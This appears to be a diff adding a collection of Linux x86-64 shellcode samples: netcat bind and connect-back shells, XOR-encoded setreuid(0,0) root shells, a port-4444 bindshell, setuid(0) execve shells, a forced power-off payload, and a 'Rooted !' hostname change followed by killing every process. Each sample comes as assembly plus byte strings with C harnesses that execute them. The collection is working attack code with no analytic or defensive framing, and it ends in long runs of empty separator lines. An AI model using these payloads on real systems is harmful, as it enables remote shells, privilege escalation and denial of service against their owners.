+push	r10  ;push address of '1337'
+push	r9   ;push address of '-p'
+push	r8   ;push address of '-l'
+push 	rdi  ;push address of '/bin/nc'
+
+mov    	rsi,rsp
+mov    	al,59
+syscall
+
+; _bytecode_start_
+;\x48\x31\xd2\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63
+;\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62
+;\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x48\x89\xe1
+;\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\x48\xc1\xeb
+;\x30\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33
+;\x33\x37\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\x49\xb9
+;\xff\xff\xff\xff\xff\xff\x2d\x70\x49\xc1\xe9\x30\x41
+;\x51\x49\x89\xe1\x49\xb8\xff\xff\xff\xff\xff\xff\x2d
+;\x6c\x49\xc1\xe8\x30\x41\x50\x49\x89\xe0\x52\x51\x53
+;\x41\x52\x41\x51\x41\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
+; _bytecode_end_
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; { Title: Shellcode linux/x86-64 connect back shell }
+
+; Author    : Gaussillusion
+; Len       : 109 bytes
+; Language  : Nasm
+
+;syscall: execve("/bin/nc",{"/bin/nc","ip","1337","-e","/bin/sh"},NULL)
+
+BITS 64
+xor    	rdx,rdx
+mov 	rdi,0x636e2f6e69622fff
+shr	rdi,0x08
+push 	rdi
+mov 	rdi,rsp
+
+mov	rcx,0x68732f6e69622fff
+shr	rcx,0x08
+push 	rcx
+mov	rcx,rsp
+
+mov     rbx,0x652dffffffffffff
+shr	rbx,0x30
+push	rbx
+mov	rbx,rsp
+
+mov	r10,0x37333331ffffffff
+shr 	r10,0x20
+push 	r10
+mov	r10,rsp
+
+jmp short ip
+continue:
+pop 	r9
+
+push	rdx  ;push NULL
+push 	rcx  ;push address of 'bin/sh'
+push	rbx  ;push address of '-e'
+push	r10  ;push address of '1337'
+push	r9   ;push address of 'ip'
+push 	rdi  ;push address of '/bin/nc'
+
+mov    	rsi,rsp
+mov    	al,59
+syscall
+
+
+ip:
+	call  continue
+	db "127.0.0.1"
+
+
+;______________________bytecode_______________________
+;\x48\x31\xd2\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63
+;\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62
+;\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x48\x89\xe1
+;\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\x48\xc1\xeb
+;\x30\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33
+;\x33\x37\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\xeb\x11
+;\x41\x59\x52\x51\x53\x41\x52\x41\x51\x57\x48\x89\xe6
+;\xb0\x3b\x0f\x05\xe8\xea\xff\xff\xff\x31\x32\x37\x2e
+;\x30\x2e\x30\x2e\x31
+;______________________bytecode_______________________
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+# Title: Linux x86-64 setreuid (0,0) & execve("/bin/ash",NULL,NULL) + XOR encoded - 85 bytes
+# Author: egeektronic <info (at) egeektronic {dot} com>
+# Twitter: @egeektronic
+# Tested on: Slackware 13.37
+# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer
+
+unsigned char shellcode[] = 
+"\x4d\x31\xc0\x41\xb1\x7f\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb"
+"\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48"
+"\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x37\x4e\xbf\x37\xfc\xbf"
+"\x0e\x37\x4e\x80\x37\x4e\x89\x70\x7a\x94\x6f\x37\x4e\xbf\x37"
+"\xfc\xbf\x44\x20\x37\x4e\x89\x37\x4e\xad\x70\x7a\x97\x94\x80"
+"\x80\x80\x50\x1d\x16\x11\x50\x1e\x0c\x17";
+int main(void) { ((void (*)())shellcode)(); }
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+# Title: Linux x86-64 setreuid (0,0) & execve("/bin/csh", ["/bin/csh", NULL]) + XOR encoded - 87 bytes
+# Author: egeektronic <info (at) egeektronic {dot} com>
+# Twitter: @egeektronic
+# Tested on: Slackware 13.37
+# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer
+
+unsigned char shellcode[] = 
+"\x4d\x31\xc0\x41\xb1\xe3\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb"
+"\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48"
+"\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\xab\xd2\x23\xab\x60\x23"
+"\x92\xab\xd2\x1c\xab\xd2\x15\xec\xe6\x08\xf1\xab\xd2\x23\xab"
+"\x60\x23\xd8\xbc\xab\xd2\x31\xb1\xb4\xab\x6a\x05\xec\xe6\x0b"
+"\x0a\x1c\x1c\x1c\xcc\x81\x8a\x8d\xcc\x80\x90\x8b";                                     
+int main(void) { ((void (*)())shellcode)(); }
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+# Title: Linux x86-64 setreuid (0,0) & execve("/bin/ksh", ["/bin/ksh", NULL]) + XOR encoded - 87 bytes
+# Author: egeektronic <info (at) egeektronic {dot} com>
+# Twitter: @egeektronic
+# Tested on: Slackware 13.37
+# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer
+
+unsigned char shellcode[] = 
+"\x4d\x31\xc0\x41\xb1\x17\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb"
+"\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48"
+"\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x5f\x26\xd7\x5f\x94\xd7"
+"\x66\x5f\x26\xe8\x5f\x26\xe1\x18\x12\xfc\x05\x5f\x26\xd7\x5f"
+"\x94\xd7\x2c\x48\x5f\x26\xc5\x45\x40\x5f\x9e\xf1\x18\x12\xff"
+"\xfe\xe8\xe8\xe8\x38\x75\x7e\x79\x38\x7c\x64\x7f";                                    
+int main(void) { ((void (*)())shellcode)(); }
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+# Title: Linux x86-64 setreuid (0,0) & execve("/bin/zsh", ["/bin/zsh", NULL]) + XOR encoded - 87 bytes
+# Author: egeektronic <info (at) egeektronic {dot} com>
+# Twitter: @egeektronic
+# Tested on: Slackware 13.37
+# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer
+
+unsigned char shellcode[] = 
+"\x4d\x31\xc0\x41\xb1\x3c\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb"
+"\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48"
+"\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x74\x0d\xfc\x74\xbf\xfc"
+"\x4d\x74\x0d\xc3\x74\x0d\xca\x33\x39\xd7\x2e\x74\x0d\xfc\x74"
+"\xbf\xfc\x07\x63\x74\x0d\xee\x6e\x6b\x74\xb5\xda\x33\x39\xd4"
+"\xd5\xc3\xc3\xc3\x13\x5e\x55\x52\x13\x46\x4f\x54";                                     
+int main(void) { ((void (*)())shellcode)(); }
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+linux/x86-64  bindshell(port 4444)
+xi4oyu [at] 80sec.com
+http://www.80sec.com
+ 
+ 
+BITS 64
+xor eax,eax
+xor ebx,ebx
+xor edx,edx
+;socket
+mov al,0x1
+mov esi,eax
+inc al
+mov edi,eax
+mov dl,0x6
+mov al,0x29
+syscall
+xchg ebx,eax ;store the server sock
+;bind
+xor  rax,rax
+push   rax
+push 0x5c110102
+mov  [rsp+1],al
+mov  rsi,rsp
+mov  dl,0x10
+mov  edi,ebx
+mov  al,0x31
+syscall
+;listen
+mov  al,0x5
+mov esi,eax
+mov  edi,ebx
+mov  al,0x32
+syscall
+;accept
+xor edx,edx
+xor esi,esi
+mov edi,ebx
+mov al,0x2b
+syscall
+mov edi,eax ; store sock
+;dup2
+xor rax,rax
+mov esi,eax
+mov al,0x21
+syscall
+inc al
+mov esi,eax
+mov al,0x21
+syscall
+inc al
+mov esi,eax
+mov al,0x21
+syscall
+;exec
+xor rdx,rdx
+mov rbx,0x68732f6e69622fff
+shr rbx,0x8
+push rbx
+mov rdi,rsp
+xor rax,rax
+push rax
+push rdi
+mov  rsi,rsp
+mov al,0x3b
+syscall
+push rax
+pop  rdi
+mov al,0x3c
+syscall
+*/
+ 
+main() {
+        char shellcode[] =
+        "\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2"
+        "\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c"
+        "\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05"
+        "\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89"
+        "\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f"
+        "\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21"
+        "\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+        "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89"
+        "\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05";
+        
+        (*(void (*)()) shellcode)();
+}
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+setuid(0) + execve(/bin/sh) - just 4 fun. 
+xi4oyu [at] 80sec.com
+ 
+main(){
+__asm(  "xorq %rdi,%rdi\n\t"
+        "mov $0x69,%al\n\t"
+        "syscall \n\t"
+        "xorq   %rdx, %rdx \n\t"
+        "movq   $0x68732f6e69622fff,%rbx; \n\t"
+        "shr    $0x8, %rbx; \n\t"
+        "push   %rbx; \n\t"
+        "movq   %rsp,%rdi; \n\t"
+        "xorq   %rax,%rax; \n\t"
+        "pushq  %rax; \n\t"
+        "pushq  %rdi; \n\t"
+        "movq   %rsp,%rsi; \n\t"
+        "mov    $0x3b,%al; \n\t"
+        "syscall ; \n\t"
+        "pushq  $0x1 ; \n\t"
+        "pop    %rdi ; \n\t"
+        "pushq  $0x3c ; \n\t"
+        "pop    %rax ; \n\t"
+        "syscall  ; \n\t"
+);
+}
+*/
+main() {
+        char shellcode[] =
+        "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
+        "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
+        "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
+        "\x58\x0f\x05";
+        (*(void (*)()) shellcode)();
+}
+ 
+2009-05-14
+evil.xi4oyu 
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+# [Linux/X86-64]
+# Dummy for shellcode:
+# execve("/bin/sh", ["/bin/sh"], NULL)
+# hophet [at] gmail.com
+
+.text
+	.globl _start
+_start:
+	
+	xorq	%rdx, %rdx
+	movq	$0x68732f6e69622fff,%rbx
+	shr	$0x8, %rbx
+	push	%rbx
+	movq	%rsp,%rdi
+	xorq	%rax,%rax
+	pushq	%rax
+	pushq	%rdi
+	movq	%rsp,%rsi
+	mov	$0x3b,%al	# execve(3b)
+	syscall
+
+	pushq	$0x1
+	pop	%rdi
+	pushq	$0x3c		# exit(3c)
+	pop	%rax
+	syscall
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+# Linux/x86_64 execve("/bin/sh"); 30 bytes shellcode
+# Date: 2010-04-26
+# Author: zbt
+# Tested on: x86_64 Debian GNU/Linux
+ 
+/*
+    ; execve("/bin/sh", ["/bin/sh"], NULL)
+ 
+    section .text
+            global _start
+ 
+    _start:
+            xor     rdx, rdx
+            mov     qword rbx, '//bin/sh'
+            shr     rbx, 0x8
+            push    rbx
+            mov     rdi, rsp
+            push    rax
+            push    rdi
+            mov     rsi, rsp
+            mov     al, 0x3b
+            syscall
+*/
+ 
+int main(void)
+{
+    char shellcode[] =
+    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
+    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
+    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
+    "\x53"                                          // push   %rbx
+    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
+    "\x50"                                          // push   %rax
+    "\x57"                                          // push   %rdi
+    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
+    "\xb0\x3b"                                      // mov    $0x3b, %al
+    "\x0f\x05";                                     // syscall
+ 
+    (*(void (*)()) shellcode)();
+     
+    return 0;
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+# Linux/x86_64 reboot(POWER_OFF) 19 bytes shellcode
+# Date: 2010-04-25
+# Author: zbt
+# Tested on: x86_64 Debian GNU/Linux
+ 
+ 
+/*
+    ; reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
+LINUX_REBOOT_CMD_POWER_OFF)
+ 
+    section .text
+        global _start
+ 
+    _start:
+        mov     edx, 0x4321fedc
+        mov     esi, 0x28121969
+        mov     edi, 0xfee1dead
+        mov     al,  0xa9
+        syscall
+*/
+int main(void)
+{
+    char reboot[] =
+    "\xba\xdc\xfe\x21\x43"  // mov    $0x4321fedc,%edx
+    "\xbe\x69\x19\x12\x28"  // mov    $0x28121969,%esi
+    "\xbf\xad\xde\xe1\xfe"  // mov    $0xfee1dead,%edi
+    "\xb0\xa9"              // mov    $0xa9,%al
+    "\x0f\x05";             // syscall
+ 
+    (*(void (*)()) reboot)();
+ 
+    return 0;
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+# Linux/x86_64 sethostname() & killall 33 bytes shellcode
+# Date: 2010-04-26
+# Author: zbt
+# Tested on: x86_64 Debian GNU/Linux
+ 
+ 
+/*
+    ; sethostname("Rooted !");
+    ; kill(-1, SIGKILL);
+ 
+ 
+    section .text
+        global _start
+ 
+    _start:
+ 
+        ;-- setHostName("Rooted !"); 22 bytes --;
+        mov     al, 0xaa
+        mov     r8, 'Rooted !'
+        push    r8
+        mov     rdi, rsp
+        mov     sil, 0x8
+        syscall
+ 
+        ;-- kill(-1, SIGKILL); 11 bytes --;
+        push    byte 0x3e
+        pop     rax
+        push    byte 0xff
+        pop     rdi
+        push    byte 0x9
+        pop     rsi
+        syscall
+*/
+int main(void)
+{
+    char shellcode[] =
+    "\xb0\xaa\x49\xb8\x52\x6f\x6f\x74\x65\x64\x20\x21\x41\x50\x48\x89"
+    "\xe7\x40\xb6\x08\x0f\x05\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05";
+ 
+    (*(void (*)()) shellcode)();
+ 
+    return 0;
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
